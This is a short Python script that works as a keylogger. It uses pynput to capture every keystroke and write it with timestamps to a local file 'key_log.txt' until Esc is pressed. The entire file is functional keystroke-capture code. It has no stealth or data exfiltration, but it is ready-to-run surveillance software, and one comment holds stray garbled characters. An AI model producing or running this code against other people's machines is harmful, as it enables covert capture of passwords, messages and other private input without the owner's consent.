from pynput.keyboard import Key, Listener
import logging

# Make a log file
log_dir = ""

# Format the logms d sc sd ca k  
logging.basicConfig(filename=(log_dir+ "key_log.txt"), level=logging.DEBUG, format= '%(asctime)s: %(message)s')

# Function to monitor keyword inputs 

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return False

# Indicates that listener is on
with Listener(on_press= on_press) as listener:
    listener.join()